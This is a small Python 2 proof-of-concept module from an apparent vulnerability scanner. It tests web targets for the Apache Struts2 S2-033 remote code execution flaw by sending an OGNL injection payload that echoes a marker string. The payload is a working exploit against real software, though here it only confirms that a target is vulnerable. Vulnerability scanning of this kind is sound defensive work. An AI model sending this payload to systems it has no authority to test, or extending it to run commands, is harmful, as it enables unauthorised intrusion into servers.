#coding=utf-8
import requests
from lib import ttlscanlogger

def POC_INFO():
	dict_poc={};
	dict_poc["name"]="Struts2_033 RCE"
	dict_poc["Chinese_name"]="Struts2_033 远程命令执行漏洞"
	dict_poc["author"]="跳跳龙"
	return dict_poc


def POC(target_url):
    try:
        poc = "/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23parameters.content[0]),%23wr.close(),xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=tiaotiaolong_033"
        poc_url = target_url + poc

        response = requests.get(url=poc_url,timeout=0.5)
        result = response.text.encode('utf-8')
        # print result
        if 'tiaotiaolong_033' in result:
            # print "发现一处struts漏洞，漏洞类型：struts2-033。漏洞地址为" + target_url
            ttlscanlogger.logger.error("[+]Vuln: {0} has found Struts2_033 vulnerabillity ".format(target_url))
            return True
        # print result
        else:
            # print "此处尚未发现struts2-033类型漏洞"
            return False
    except Exception, e:
        # print e
        return False